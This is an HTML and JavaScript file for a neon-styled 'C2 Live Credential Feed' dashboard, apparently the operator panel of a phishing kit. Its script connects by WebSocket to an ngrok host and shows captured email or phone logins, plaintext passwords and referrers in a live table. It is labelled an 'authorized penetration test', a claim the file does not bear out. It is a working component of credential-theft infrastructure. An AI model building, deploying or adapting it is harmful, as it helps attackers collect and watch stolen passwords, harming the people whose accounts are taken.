<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Neon Admin Dashboard — Pen Test C2</title>
<style>
/* --- Styles copied from your request (omitted here for brevity) --- */
* { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins',sans-serif; }
body { background:#0a001f; color:#fff; padding:20px; }

.dashboard-header {
  background: linear-gradient(135deg,#7f00ff,#00bfff);
  color:#fff; padding:30px; border-radius:15px;
  text-align:center; box-shadow:0 0 20px #7f00ff,0 0 40px #00bfff;
}
.dashboard-header h1 { font-size:2rem; font-weight:900; text-shadow:0 0 8px #fff,0 0 15px #ff00ff; }
.dashboard-header p { color:#c0f0ff; margin-top:5px; font-weight:bold; }

/* Stats Cards */
.stats-container {
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
  gap:20px; margin-bottom:25px;
}
.stat-card {
  background:rgba(255,255,255,0.05); padding:25px; border-radius:15px;
  text-align:center; box-shadow:0 0 10px #7f00ff,0 0 20px #00bfff;
  transition: transform 0.3s, box-shadow 0.3s;
}
.stat-card:hover { transform:scale(1.05); box-shadow:0 0 20px #ff00ff,0 0 40px #00ffff; }
.stat-number { font-size:2.5em; font-weight:bold; color:#00ffff; text-shadow:0 0 10px #00ffff; }

/* Users table */
.users-container {
  background: rgba(255,255,255,0.05); padding:20px; border-radius:15px;
  box-shadow:0 0 15px #7f00ff,0 0 30px #00bfff;
}
.users-container h2 { margin-bottom:15px; }
table { width:100%; border-collapse:collapse; }
th, td { padding:12px; text-align:left; border-bottom:1px solid #00bfff; }
th { color:#ff00ff; }
tr:hover { background:rgba(0,255,255,0.1); }

/* Connection status */
.connection-status {
  position: fixed; top:20px; right:20px; padding:12px 18px;
  border-radius:25px; font-size:14px; font-weight:bold; text-shadow:0 0 5px #fff;
  z-index:999;
}
.connected { background:#0ff; color:#0a001f; box-shadow:0 0 15px #0ff,0 0 30px #0ff; }
.disconnected { background:#ff00bf; color:#0a001f; box-shadow:0 0 15px #ff00bf,0 0 30px #ff00bf; }

</style>
</head>
<body>

<div class="dashboard-header">
  <h1>🌌 AY C2 Live Credential Feed</h1>
  <p>Real-time authorized penetration test data capture with neon vibes</p>
</div>

<div class="stats-container">
  <div class="stat-card">
    <div class="stat-number" id="totalCaptures">0</div>
    <div>Total Captures</div>
  </div>
  <div class="stat-card">
    <div class="stat-number" id="activeSessions">1</div>
    <div>Active Dashboard Sessions</div>
  </div>
  <div class="stat-card">
    <div class="stat-number" id="captureRate">~</div>
    <div>Rate/Minute</div>
  </div>
</div>

<div class="users-container">
  <h2>🔒 Captured Credentials</h2>
  
  <table>
    <thead>
      <tr>
        <th>Captured At</th>
        <th>Login ID (Email/Phone)</th>
        <th>Password</th>
        <th>Source Referrer</th>
      </tr>
    </thead>
    <tbody id="usersTableBody">
      <!-- Credentials will be inserted here -->
    </tbody>
  </table>
</div>

<div id="connectionStatus" class="connection-status disconnected">🔴 DISCONNECTED</div>

<script>
class AdminDashboard {
  constructor() {
    this.capturedData = [];
    this.totalCaptures = 0;
    
      // --- WebSocket server address ---
      // For local testing use the HTTP server's WS path. When exposing
      // via ngrok or a secure proxy, change to the ngrok/host URL and
      // use `wss://` (secure WebSocket).
      this.wsUrl = 'wss://unvulcanized-unmellowed-tobi.ngrok-free.dev/ws';
    // If you are using SSL/TLS, change to 'wss://...'
    
    this.stats = { totalCaptures: 0, activeSessions: 1, lastCaptureTime: null };
    
    this.initWebSocket();
  }

  initWebSocket() {
    if (this.ws) { this.ws.close(); } // Clean up previous connection on reconnect
    
    this.ws = new WebSocket(this.wsUrl);

    this.ws.onopen = () => { 
      this.updateConnectionStatus(true); 
      console.log("Connected to Live Credential Feed");
    };

    this.ws.onmessage = e => { 
      try {
        const data = JSON.parse(e.data); // Data is the raw credential JSON sent from server.js

        if (data.loginID && data.password && data.timestamp) {
            this.addCaptureEntry(data);
        }
      } catch(err) { 
        console.error("Message parsing error:", err); 
        console.error("Received raw data:", e.data);
      }
    };

    this.ws.onclose = () => { 
      this.updateConnectionStatus(false);
      console.log("Connection closed. Attempting reconnect in 5s...");
      setTimeout(() => this.initWebSocket(), 5000); 
    };

    this.ws.onerror = e => {
      console.error("WebSocket Error:", e);
      // Attempt to close and reconnect on error
      if (this.ws.readyState !== WebSocket.CLOSED) {
          this.ws.close();
      }
    }
  }

  addCaptureEntry(data){
    this.capturedData.unshift(data); // Add entry to the beginning of the array
    this.totalCaptures++;
    this.updateStats();
    this.renderTable();
  }

  updateStats(){
    this.stats.totalCaptures = this.totalCaptures;

    document.getElementById('totalCaptures').textContent = this.stats.totalCaptures;
    // Note: Active Sessions is hardcoded to 1 as the server doesn't send this info.
    document.getElementById('activeSessions').textContent = 1; 
  }

  renderTable(){
    const tbody = document.getElementById('usersTableBody');
    const newEntry = this.capturedData[0]; // Get the most recent entry
    if (!newEntry) return;

    const tr = document.createElement('tr');
    tr.style.animation = 'fadeIn 0.5s ease-in-out';
    tr.innerHTML = `
      <td>${new Date(newEntry.timestamp).toLocaleString()}</td>
      <td><strong style="color:#00ffff;">${newEntry.loginID}</strong></td>
      <td><strong style="color:#ff00ff;">${newEntry.password}</strong></td>
      <td>${newEntry.referrer || 'Direct'}</td>
    `;
    
    // Insert new row at the top of the table
    if (tbody.firstChild) {
      tbody.insertBefore(tr, tbody.firstChild);
    } else {
      tbody.appendChild(tr);
    }
    
    // Optional: Keep table size manageable (e.g., max 50 entries)
    while (tbody.rows.length > 50) {
        tbody.deleteRow(50);
    }
  }

  updateConnectionStatus(connected){
    const statusEl = document.getElementById('connectionStatus');

    if(connected){
      statusEl.className = 'connection-status connected';
      statusEl.textContent = '🟢 CONNECTED - LIVE';
    } else {
      statusEl.className = 'connection-status disconnected';
      statusEl.textContent = '🔴 DISCONNECTED';
    }
  }
}

// Initialize the dashboard
document.addEventListener("DOMContentLoaded", () => {
    const dashboard = new AdminDashboard();
});
</script>
<style>
/* Add keyframes for visual flair on new rows */
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}
</style>
</body>
</html>
